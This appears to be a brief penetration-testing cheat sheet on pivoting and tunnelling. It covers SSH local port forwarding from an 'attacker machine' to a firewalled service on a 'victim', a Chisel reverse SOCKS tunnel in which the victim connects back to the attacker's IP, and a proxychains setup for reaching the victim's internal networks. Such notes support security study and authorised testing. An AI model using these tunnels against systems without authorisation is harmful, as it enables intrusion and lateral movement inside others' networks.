
## See exposed sockets

See what socket is used on the machine :

```
ss -tulpn
```

## Using ssh to expose service

If a service is running on lets say port 8080 of a machine (and is blocked by a firewall), you can redirect the trafic to your machine on port 2222 for exemple :

```bash
#attacker machine
ssh -L 2222:127.0.0.1:8080 <user>@<victim ip>
# 2222 est le port local (attaquant) et 8080 est le port a exposer (victime)
```

Access the hidden service on `127.0.0.1:2222` on the attacker machine

## Chisel

[Chisel Tunneling](http://michalszalkowski.com/security/pivoting-tunneling-port-forwarding/chisel-socks5-tunneling-windows-rev/)

On host :
```
./chisel.elf server -p 8080 --reverse
```

On victim : 
```
./chisel.elf client <YourIP>:8080 R:socks
```

### Setup and use ProxyChains with Chisel

Create a proxychains.conf : 
```
proxy_dns
tcp_read_time_out 200
tcp_connect_time_out 200
[ProxyList]
socks5	127.0.0.1 1080
```

Launch the server, connect the client and you can access the IPs on the networks your client has access to, from your attacker machine with the command : 

```
proxychains -q <command> # -q for quiet
```

